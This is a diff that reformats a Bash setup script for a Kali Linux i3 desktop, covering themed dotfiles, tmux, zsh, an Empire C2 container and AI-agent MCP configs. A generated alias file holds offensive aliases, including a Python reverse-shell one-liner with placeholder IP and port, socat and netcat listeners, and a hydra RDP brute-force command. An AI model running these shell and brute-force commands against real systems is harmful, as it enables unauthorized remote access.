@@ -115,7 +115,7 @@ write_file_if_missing() {
     local perms="${3:-644}"
     [[ -f "${dest}" ]] && return 0
     mkdir -p "$(dirname "${dest}")"
-    printf "%s" "${content}" > "${dest}"
+    printf "%s" "${content}" >"${dest}"
     chmod "${perms}" "${dest}"
     chown "${TARGET_UID}:${TARGET_GID}" "${dest}" 2>/dev/null || true
     ok "Created: ${dest}"
@@ -155,7 +155,7 @@ step_deploy_dotfiles() {
     local wrapper_dir="${TARGET_HOME}/.local/bin"
     local wrapper_path="${wrapper_dir}/vmware-clipboard"
     run_as_user "mkdir -p ${wrapper_dir}"
-    cat > "${wrapper_path}" <<'WMCLIP'
+    cat >"${wrapper_path}" <<'WMCLIP'
 #!/bin/bash
 # VMware Clipboard Wrapper for i3
 # Ensures proper X11 display context for clipboard daemon
@@ -174,7 +174,7 @@ WMCLIP
     ok "Created: ~/.local/bin/vmware-clipboard"
 
     # i3 config - NEON MINIMAL
-    cat > "${cfg_dir}/i3/config" <<I3CONF
+    cat >"${cfg_dir}/i3/config" <<I3CONF
 # i3-wm Config - NEON MINIMAL Theme
 # Background: ${NEON_BG}, Accent: ${NEON_ACCENT} (teal), Dim: ${NEON_ACCENT_DIM}, Cyan: ${NEON_CYAN}
 
@@ -312,7 +312,7 @@ I3CONF
 
     # Polybar config - NEON MINIMAL with FiraCode Nerd Font (SketchyBar-style islands)
     # Create launch script with aggressive cleanup
-    cat > "${cfg_dir}/polybar/launch.sh" <<LAUNCH
+    cat >"${cfg_dir}/polybar/launch.sh" <<LAUNCH
 #!/usr/bin/env bash
 # ~/.config/polybar/launch.sh
 # Aggressive cleanup + launch Polybar with hardcoded eth0
@@ -340,7 +340,7 @@ LAUNCH
     primary_iface=$(ip -o route get 1.1.1.1 2>/dev/null | awk '{print $5}' | head -1)
     primary_iface="${primary_iface:-eth0}"
 
-    cat > "${cfg_dir}/polybar/config.ini" <<POLYCONF
+    cat >"${cfg_dir}/polybar/config.ini" <<POLYCONF
 [colors]
 background = ${NEON_BG}
 foreground = ${NEON_FG}
@@ -420,7 +420,7 @@ POLYCONF
     ok "Created: polybar/config.ini (NEON MINIMAL)"
 
     # Rofi config - NEON MINIMAL with FiraCode Nerd Font
-    cat > "${cfg_dir}/rofi/config.rasi" <<ROFI
+    cat >"${cfg_dir}/rofi/config.rasi" <<ROFI
 configuration {
     show-icons: true;
     icon-theme: "Papirus-Dark";
@@ -457,7 +457,7 @@ ROFI
     ok "Created: rofi/config.rasi (NEON MINIMAL)"
 
     # Picom config - NEON MINIMAL with rounded corners (xrender for VMware)
-    cat > "${cfg_dir}/picom.conf" <<PICOM
+    cat >"${cfg_dir}/picom.conf" <<PICOM
 backend = "xrender";
 vsync = true;
 shadow = true;
@@ -482,7 +482,7 @@ PICOM
     ok "Created: picom.conf"
 
     # Kitty config - NEON MINIMAL with FiraCode Nerd Font
-    cat > "${cfg_dir}/kitty/kitty.conf" <<KITTY
+    cat >"${cfg_dir}/kitty/kitty.conf" <<KITTY
 font_family FiraCode Nerd Font
 font_size 11.0
 bold_font auto
@@ -523,7 +523,7 @@ KITTY
     ok "Created: kitty/kitty.conf (NEON MINIMAL)"
 
     # Alacritty config - NEON MINIMAL (YAML for legacy, TOML for v0.13+)
-    cat > "${cfg_dir}/alacritty/alacritty.yml" <<ALACRITTY
+    cat >"${cfg_dir}/alacritty/alacritty.yml" <<ALACRITTY
 font:
   normal:
     family: FiraCode Nerd Font
@@ -574,7 +574,7 @@ colors:
     white:   "#FFFFFF"
 ALACRITTY
 
-    cat > "${cfg_dir}/alacritty/alacritty.toml" <<ALACRITTY_TOML
+    cat >"${cfg_dir}/alacritty/alacritty.toml" <<ALACRITTY_TOML
 [font]
 normal = { family = "FiraCode Nerd Font", style = "Regular" }
 bold = { family = "FiraCode Nerd Font", style = "Bold" }
@@ -627,7 +627,7 @@ ALACRITTY_TOML
     ok "Created: alacritty/alacritty.yml + alacritty.toml (NEON MINIMAL)"
 
     # GTK settings - NEON MINIMAL with FiraCode Nerd Font
-    cat > "${cfg_dir}/gtk-3.0/settings.ini" <<'GTKCONF'
+    cat >"${cfg_dir}/gtk-3.0/settings.ini" <<'GTKCONF'
 [Settings]
 gtk-theme-name = Arc-Dark
 gtk-icon-theme-name = Papirus-Dark
@@ -636,14 +636,13 @@ gtk-cursor-theme-name = Breeze
 GTKCONF
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/gtk-3.0/settings.ini"
 
-    cat > "${cfg_dir}/gtk-4.0/settings.ini" <<'GTK4'
+    cat >"${cfg_dir}/gtk-4.0/settings.ini" <<'GTK4'
 [Settings]
 gtk-theme-name = Arc-Dark
 gtk-icon-theme-name = Papirus-Dark
 gtk-font-name = FiraCode Nerd Font 10
 GTK4
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/gtk-4.0/settings.ini"
-
 
     ok "Dotfiles deployed (NEON MINIMAL)"
 }
@@ -677,8 +676,8 @@ step_deploy_wallpapers() {
         ok "Wallpaper generated: ImageMagick gradient #06080f-#121620"
     else
         warn "ImageMagick not found — generating solid wallpaper fallback"
-        run_as_user "python3 -c \"from PIL import Image; img=Image.new('RGB',(1920,1080),color='#06080f'); img.save('${wallpaper}')\"" 2>/dev/null \
-            || run_as_user "printf 'P6\n1920 1080\n255\n' > '${wallpaper}' && python3 -c \"import sys; open(sys.argv[1],'ab').write(bytes([0x0A]*1920*1080*3))\" '${wallpaper}' 2>/dev/null || true"
+        run_as_user "python3 -c \"from PIL import Image; img=Image.new('RGB',(1920,1080),color='#06080f'); img.save('${wallpaper}')\"" 2>/dev/null ||
+            run_as_user "printf 'P6\n1920 1080\n255\n' > '${wallpaper}' && python3 -c \"import sys; open(sys.argv[1],'ab').write(bytes([0x0A]*1920*1080*3))\" '${wallpaper}' 2>/dev/null || true"
         chown "${TARGET_UID}:${TARGET_GID}" "${wallpaper}" 2>/dev/null || true
         ok "Wallpaper generated: solid #06080f fallback"
     fi
@@ -693,7 +692,7 @@ step_setup_tmux_neon() {
     local scripts_dir="${cfg_dir}/scripts"
     run_as_user "mkdir -p ${cfg_dir}/tmux.conf.d ${scripts_dir}"
 
-    cat > "${cfg_dir}/tmux.conf" <<TMUXCONF
+    cat >"${cfg_dir}/tmux.conf" <<TMUXCONF
 # TMUX Config - NEON MINIMAL Theme
 # Background: ${NEON_BG}, Accent: ${NEON_ACCENT} (Azul Neon Atenuado), #00ff66 (green), #7B2CBF (purple)
 
@@ -741,7 +740,7 @@ TMUXCONF
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/tmux.conf"
     ok "Created: tmux/tmux.conf (NEON MINIMAL)"
 
-    cat > "${scripts_dir}/agent-status.sh" <<'AGENTSTATUS'
+    cat >"${scripts_dir}/agent-status.sh" <<'AGENTSTATUS'
 #!/usr/bin/env bash
 # Gentle Agent State Integration for TMUX
 # NEON MINIMAL style
@@ -765,7 +764,7 @@ AGENTSTATUS
     chown "${TARGET_UID}:${TARGET_GID}" "${scripts_dir}/agent-status.sh"
     ok "Created: tmux/scripts/agent-status.sh"
 
-    cat > "${scripts_dir}/update-status.sh" <<'UPDATESTATUS'
+    cat >"${scripts_dir}/update-status.sh" <<'UPDATESTATUS'
 #!/usr/bin/env bash
 # Update tmux status on events
 # NEON MINIMAL style
@@ -776,7 +775,7 @@ UPDATESTATUS
     chown "${TARGET_UID}:${TARGET_GID}" "${scripts_dir}/update-status.sh"
     ok "Created: tmux/scripts/update-status.sh"
 
-    cat > "${cfg_dir}/tmux.conf.d/agents.conf" <<AGENTS
+    cat >"${cfg_dir}/tmux.conf.d/agents.conf" <<AGENTS
 # TMUX Agent State Hooks - NEON MINIMAL
 
 set -g status-left "#[fg=${NEON_ACCENT}, bg=${NEON_BG}] 🔱 KALI #[fg=#7b2cbf, bg=${NEON_BG}] #S #(\$HOME/.config/tmux/scripts/agent-status.sh)#[default]"
@@ -822,7 +821,7 @@ step_install_zsh_omz() {
 step_deploy_zshrc() {
     header "Deploy .zshrc Configuration (NEON)"
 
-    cat > "${TARGET_HOME}/.zshrc" <<'ZSHRC'
+    cat >"${TARGET_HOME}/.zshrc" <<'ZSHRC'
 export ZSH="${HOME}/.oh-my-zsh"
 ZSH_THEME="powerlevel10k/powerlevel10k"
 plugins=(git)
@@ -859,7 +858,7 @@ step_deploy_hacker_profile() {
     local zsh_dir="${TARGET_HOME}/.config/zsh"
     run_as_user "mkdir -p ${zsh_dir}"
 
-    cat > "${zsh_dir}/hacker_profile.zsh" <<HACKERPROFILE
+    cat >"${zsh_dir}/hacker_profile.zsh" <<HACKERPROFILE
 # =============================================================================
 # Hacker Profile — Security Tools Aliases & Agent Variables
 # Generated by setup_i3_kali.sh
@@ -899,7 +898,7 @@ alias hydra-rdp='hydra -L users.txt -P pass.txt rdp://'
 
 # --- Reverse Shells & Listeners ---
 alias rlwrap-nc='rlwrap nc -lvnp'
-alias socat-shell='socat file:`tty`,raw,echo=0 tcp-listen:4444'
+alias socat-shell='socat file:$(tty),raw,echo=0 tcp-listen:4444'
 alias python-shell="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
 
 # --- File Transfer ---
@@ -986,7 +985,7 @@ step_switch_display_manager() {
 
     # Configure SDDM to use neon-minimal theme
     run_as_root "mkdir -p /etc/sddm.conf.d"
-    cat > /etc/sddm.conf.d/kali-i3.conf <<'SDDMCONF'
+    cat >/etc/sddm.conf.d/kali-i3.conf <<'SDDMCONF'
 [Theme]
 Current=neon-minimal
 
@@ -1002,7 +1001,7 @@ step_setup_i3_desktop_entry() {
     header "Register i3 Session in /usr/share/xsessions/"
 
     run_as_root "mkdir -p /usr/share/xsessions"
-    cat > /usr/share/xsessions/i3.desktop <<'DESK'
+    cat >/usr/share/xsessions/i3.desktop <<'DESK'
 [Desktop Entry]
 Name=i3
 Comment=Improved tiling window manager
@@ -1034,7 +1033,7 @@ step_install_security_suite() {
     fi
 
     run_as_root "mkdir -p /opt/empire-docker"
-    cat > /opt/empire-docker/docker-compose.yml <<'EMP'
+    cat >/opt/empire-docker/docker-compose.yml <<'EMP'
 version: "3.8"
 services:
   empire:
@@ -1093,7 +1092,7 @@ step_install_gentle_agent_state() {
 
     run_as_user "git clone https://github.com/Gentleman-Programming/gentle-agent-state.git ${agent_state_dir}/gentle-agent-state 2>/dev/null || true"
 
-    cat > "${agent_state_dir}/gentle-agent.sh" <<'GENTLE_AGENT'
+    cat >"${agent_state_dir}/gentle-agent.sh" <<'GENTLE_AGENT'
 #!/usr/bin/env bash
 # Gentle Agent State Integration
 # Auto-generated by setup_i3_kali.sh
@@ -1114,7 +1113,7 @@ step_deploy_kilo_config() {
     local kilo_dir="${TARGET_HOME}/.config/kilo"
     run_as_user "mkdir -p ${kilo_dir}"
 
-    cat > "${kilo_dir}/agent.json" <<KILOCONF
+    cat >"${kilo_dir}/agent.json" <<KILOCONF
 {
   "name": "kali-i3-neon",
   "description": "NEON MINIMAL i3-wm setup for Kali Linux",
@@ -1130,7 +1129,7 @@ step_deploy_kilo_config() {
 KILOCONF
     chown "${TARGET_UID}:${TARGET_GID}" "${kilo_dir}/agent.json"
 
-    cat > "${kilo_dir}/kilo.json" <<'KJSON'
+    cat >"${kilo_dir}/kilo.json" <<'KJSON'
 {
   "name": "kali-i3",
   "version": "2.0.0",
@@ -1155,7 +1154,7 @@ step_setup_opencode() {
     local opencode_dir="${TARGET_HOME}/.config/opencode"
     run_as_user "mkdir -p ${opencode_dir}"
 
-    cat > "${opencode_dir}/.opencode.json" <<OPENCODE
+    cat >"${opencode_dir}/.opencode.json" <<OPENCODE
 {
   "name": "kali-i3-neon",
   "preset": "gentleman",
@@ -1214,7 +1213,7 @@ step_deploy_hexstrike_mcp_config() {
 
     run_as_user "mkdir -p ${opencode_dir} ${claude_dir} ${agent_state_dir}"
 
-    cat > "${opencode_dir}/hexstrike.json" <<'HEXSTRIKE_MCP'
+    cat >"${opencode_dir}/hexstrike.json" <<'HEXSTRIKE_MCP'
 {
   "server": "http://localhost:8888",
   "enabled": true,
@@ -1235,7 +1234,7 @@ HEXSTRIKE_MCP
     chown "${TARGET_UID}:${TARGET_GID}" "${opencode_dir}/hexstrike.json"
 
     if [[ -d "${claude_dir}" ]]; then
-        cat > "${claude_dir}/mcp.json" <<'CLAUDE_MCP'
+        cat >"${claude_dir}/mcp.json" <<'CLAUDE_MCP'
 {
   "mcpServers": {
     "hexstrike-ai": {
@@ -1248,7 +1247,7 @@ CLAUDE_MCP
         chown "${TARGET_UID}:${TARGET_GID}" "${claude_dir}/mcp.json"
     fi
 
-    cat > "${agent_state_dir}/mcp.json" <<'AGENT_MCP'
+    cat >"${agent_state_dir}/mcp.json" <<'AGENT_MCP'
 {
   "servers": [
     {
@@ -1359,15 +1358,15 @@ parse_phase_list() {
 
     if [[ "${spec}" == "all" ]]; then
         local i
-        for ((i=1; i<=MAX_PHASE; i++)); do
+        for ((i = 1; i <= MAX_PHASE; i++)); do
             echo "${i}"
         done
         return 0
     fi
 
-    IFS=',' read -ra parts <<< "${spec}"
+    IFS=',' read -ra parts <<<"${spec}"
     for part in "${parts[@]}"; do
-        part="${part// /}"  # strip spaces
+        part="${part// /}" # strip spaces
         if [[ "${part}" =~ ^([0-9]+)-([0-9]+)$ ]]; then
             local start="${BASH_REMATCH[1]}"
             local end="${BASH_REMATCH[2]}"
@@ -1375,7 +1374,7 @@ parse_phase_list() {
                 die "Invalid phase range: ${part} (valid: 1-${MAX_PHASE})"
             fi
             local i
-            for ((i=start; i<=end; i++)); do
+            for ((i = start; i <= end; i++)); do
                 echo "${i}"
             done
         elif [[ "${part}" =~ ^[0-9]+$ ]]; then
@@ -1418,14 +1417,14 @@ parse_args() {
     local -a remaining=()
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --lang)
-                shift
-                [[ $# -gt 0 ]] || die "Missing value for --lang"
-                I18N_LANG="$1"
-                ;;
-            *)
-                remaining+=("$1")
-                ;;
+        --lang)
+            shift
+            [[ $# -gt 0 ]] || die "Missing value for --lang"
+            I18N_LANG="$1"
+            ;;
+        *)
+            remaining+=("$1")
+            ;;
         esac
         shift
     done
@@ -1435,52 +1434,53 @@ parse_args() {
     set -- "${remaining[@]}"
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --user-only) USER_ONLY=1 ;;
-            --skip-security) SKIP_SECURITY=1 ;;
-            --skip-dotfiles) SKIP_DOTFILES=1 ;;
-            --skip-shell) SKIP_SHELL=1 ;;
-            --skip-tmux) SKIP_TMUX=1 ;;
-            --skip-ai) SKIP_AI=1 ;;
-            --interactive) INTERACTIVE=1 ;;
-            --gentle-ai) INSTALL_GENTLE_AI=1 ;;
-            --hexstrike-ai) HEXSTRIKE_AI=1 ;;
-            --phase)
-                shift
-                [[ $# -gt 0 ]] || die "Missing value for --phase"
-                PHASE_FILTER="$1"
-                # Validate the phase list eagerly so errors surface early
-                local -a _phases=()
-                while IFS= read -r _p; do
-                    [[ -n "${_p}" ]] && _phases+=("${_p}")
-                done < <(parse_phase_list "${PHASE_FILTER}")
-                [[ ${#_phases[@]} -gt 0 ]] || die "Invalid --phase specification: ${PHASE_FILTER}"
-                ;;
-            --version)
-                local version
-                version=$(grep '## \[' "${SCRIPT_DIR}/CHANGELOG.md" | grep -v 'Unreleased' | head -1 | sed 's/## \[\([^]]*\)\].*/\1/')
-                echo "${SCRIPT_NAME} ${version}"
-                exit 0
-                ;;
-            -h|--help)
-                echo "Usage: sudo ${SCRIPT_NAME} [--user-only] [--interactive] [--phase <phases>] [--skip-security] [--skip-dotfiles] [--skip-shell] [--skip-tmux] [--skip-ai] [--gentle-ai] [--hexstrike-ai] [--lang en|es] [--version]"
-                echo "  --user-only       $(msg HELP_USER_ONLY)"
-                echo "  --interactive     $(msg HELP_INTERACTIVE)"
-                echo "  --phase PHASES    Run only specific phases (e.g. 1,3,5 or 1-5 or all)."
-                echo "                    Phases: 1=core 2=display-mgr 3=dotfiles 4=tmux"
-                echo "                            5=zsh 6=desktop-entry 7=security 8=anonymity"
-                echo "                            9=ai-tools 10=hexstrike+cleanup"
-                echo "                    Takes precedence over --resume (resets state for selected phases)."
-                echo "  --skip-security   $(msg HELP_SKIP_SECURITY)"
-                echo "  --skip-dotfiles   $(msg HELP_SKIP_DOTFILES)"
-                echo "  --skip-shell      $(msg HELP_SKIP_SHELL)"
-                echo "  --skip-tmux       $(msg HELP_SKIP_TMUX)"
-                echo "  --skip-ai         $(msg HELP_SKIP_AI)"
-                echo "  --gentle-ai       $(msg HELP_GENTLE_AI)"
-                echo "  --hexstrike-ai    $(msg HELP_HEXSTRIKE_AI)"
-                echo "  --lang LANG       $(msg HELP_LANG)"
-                echo "  --version         $(msg HELP_VERSION)"
-                exit 0 ;;
-            *) die "Unknown option: $1" ;;
+        --user-only) USER_ONLY=1 ;;
+        --skip-security) SKIP_SECURITY=1 ;;
+        --skip-dotfiles) SKIP_DOTFILES=1 ;;
+        --skip-shell) SKIP_SHELL=1 ;;
+        --skip-tmux) SKIP_TMUX=1 ;;
+        --skip-ai) SKIP_AI=1 ;;
+        --interactive) INTERACTIVE=1 ;;
+        --gentle-ai) INSTALL_GENTLE_AI=1 ;;
+        --hexstrike-ai) HEXSTRIKE_AI=1 ;;
+        --phase)
+            shift
+            [[ $# -gt 0 ]] || die "Missing value for --phase"
+            PHASE_FILTER="$1"
+            # Validate the phase list eagerly so errors surface early
+            local -a _phases=()
+            while IFS= read -r _p; do
+                [[ -n "${_p}" ]] && _phases+=("${_p}")
+            done < <(parse_phase_list "${PHASE_FILTER}")
+            [[ ${#_phases[@]} -gt 0 ]] || die "Invalid --phase specification: ${PHASE_FILTER}"
+            ;;
+        --version)
+            local version
+            version=$(grep '## \[' "${SCRIPT_DIR}/CHANGELOG.md" | grep -v 'Unreleased' | head -1 | sed 's/## \[\([^]]*\)\].*/\1/')
+            echo "${SCRIPT_NAME} ${version}"
+            exit 0
+            ;;
+        -h | --help)
+            echo "Usage: sudo ${SCRIPT_NAME} [--user-only] [--interactive] [--phase <phases>] [--skip-security] [--skip-dotfiles] [--skip-shell] [--skip-tmux] [--skip-ai] [--gentle-ai] [--hexstrike-ai] [--lang en|es] [--version]"
+            echo "  --user-only       $(msg HELP_USER_ONLY)"
+            echo "  --interactive     $(msg HELP_INTERACTIVE)"
+            echo "  --phase PHASES    Run only specific phases (e.g. 1,3,5 or 1-5 or all)."
+            echo "                    Phases: 1=core 2=display-mgr 3=dotfiles 4=tmux"
+            echo "                            5=zsh 6=desktop-entry 7=security 8=anonymity"
+            echo "                            9=ai-tools 10=hexstrike+cleanup"
+            echo "                    Takes precedence over --resume (resets state for selected phases)."
+            echo "  --skip-security   $(msg HELP_SKIP_SECURITY)"
+            echo "  --skip-dotfiles   $(msg HELP_SKIP_DOTFILES)"
+            echo "  --skip-shell      $(msg HELP_SKIP_SHELL)"
+            echo "  --skip-tmux       $(msg HELP_SKIP_TMUX)"
+            echo "  --skip-ai         $(msg HELP_SKIP_AI)"
+            echo "  --gentle-ai       $(msg HELP_GENTLE_AI)"
+            echo "  --hexstrike-ai    $(msg HELP_HEXSTRIKE_AI)"
+            echo "  --lang LANG       $(msg HELP_LANG)"
+            echo "  --version         $(msg HELP_VERSION)"
+            exit 0
+            ;;
+        *) die "Unknown option: $1" ;;
         esac
         shift
     done
@@ -1590,12 +1590,12 @@ main() {
     if [[ ${SKIP_AI} -eq 1 ]]; then
         local -a filtered=()
         for step in "${ALL_STEPS[@]}"; do
-            [[ "${step}" == "step_install_gentle_ai" || \
-               "${step}" == "step_install_gentle_agent_state" || \
-               "${step}" == "step_deploy_kilo_config" || \
-               "${step}" == "step_setup_opencode" || \
-               "${step}" == "step_install_hexstrike_ai" || \
-               "${step}" == "step_deploy_hexstrike_mcp_config" ]] && continue
+            [[ "${step}" == "step_install_gentle_ai" ||
+                "${step}" == "step_install_gentle_agent_state" ||
+                "${step}" == "step_deploy_kilo_config" ||
+                "${step}" == "step_setup_opencode" ||
+                "${step}" == "step_install_hexstrike_ai" ||
+                "${step}" == "step_deploy_hexstrike_mcp_config" ]] && continue
             filtered+=("${step}")
         done
         ALL_STEPS=("${filtered[@]}")
